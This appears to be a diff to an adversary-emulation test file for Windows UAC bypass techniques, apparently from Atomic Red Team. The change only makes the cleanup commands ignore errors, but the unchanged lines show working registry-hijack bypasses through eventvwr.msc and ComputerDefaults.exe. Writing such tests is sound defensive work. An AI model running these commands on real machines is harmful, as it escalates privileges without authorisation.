@@ -44,7 +44,7 @@ atomic_tests:
       Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
       Start-Process "C:\Windows\System32\eventvwr.msc"
     cleanup_command: |
-      Remove-Item "HKCU:\software\classes\mscfile" -force -Recurse
+      Remove-Item "HKCU:\software\classes\mscfile" -force -Recurse -ErrorAction Ignore
 
 - name: Bypass UAC using Fodhelper
   description: |
@@ -115,7 +115,7 @@ atomic_tests:
       Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
       Start-Process "C:\Windows\System32\ComputerDefaults.exe"
     cleanup_command: |
-      Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse
+      Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse -ErrorAction Ignore
 
 - name: Bypass UAC by Mocking Trusted Directories
   description: |
